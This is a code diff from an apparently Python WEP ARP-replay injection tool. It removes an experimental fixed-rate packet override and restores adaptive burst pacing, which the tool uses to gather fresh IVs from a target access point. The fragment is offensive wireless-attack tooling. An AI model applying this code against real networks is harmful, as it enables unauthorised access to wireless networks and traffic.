@@ -57,12 +57,6 @@ class WepArpReplay:
 
     _MIN_BURST = 16
     _MAX_BURST = 1024
-    # EXPERIMENT KNOB: pin injection to a fixed pps (overrides the adaptive
-    # climber's burst choice — see _burst_and_measure). Set to None to use the
-    # adaptive climber. ~300 to test whether a higher fixed rate beats the
-    # climber's slow ramp post-frag.
-    _FORCED_PPS: Optional[float] = 300.0
-    _FORCED_BURST = 32
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
@@ -274,12 +268,6 @@ class WepArpReplay:
             self._failed.add(cand)
             self._current = None
             return 0
-        # EXPERIMENT (_FORCED_PPS not None): override the climber's burst with a
-        # fixed size and pace the cycle to a hard-coded pps, to compare against
-        # the adaptive climber. The climber still runs in _judge/_adapt; we just
-        # overwrite its choice here. Set _FORCED_PPS=None to restore adaptive.
-        if self._FORCED_PPS is not None:
-            self._burst_size = self._FORCED_BURST
         ivs_before = self.collector.unique_count(self.bssid)
         t0 = time.time()
         sent = 0
@@ -296,13 +284,8 @@ class WepArpReplay:
         send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
         if sent:
             self._notify_activity()   # our traffic keeps the assoc alive
-        if self._FORCED_PPS is not None:
-            # Pace to the forced rate (RX runs continuously in the driver, so a
-            # short/zero window is fine).
-            await asyncio.sleep(max(0.0, self._burst_size / self._FORCED_PPS - send_dt))
-        else:
-            # Pure-RX window — let the AP's rebroadcasts (fresh IVs) land.
-            await asyncio.sleep(self.rx_window)
+        # Pure-RX window — let the AP's rebroadcasts (fresh IVs) land.
+        await asyncio.sleep(self.rx_window)
         cycle_dt = max(1e-3, time.time() - t0)
         self._last_cycle_dt = cycle_dt
         self.stats.cycles += 1
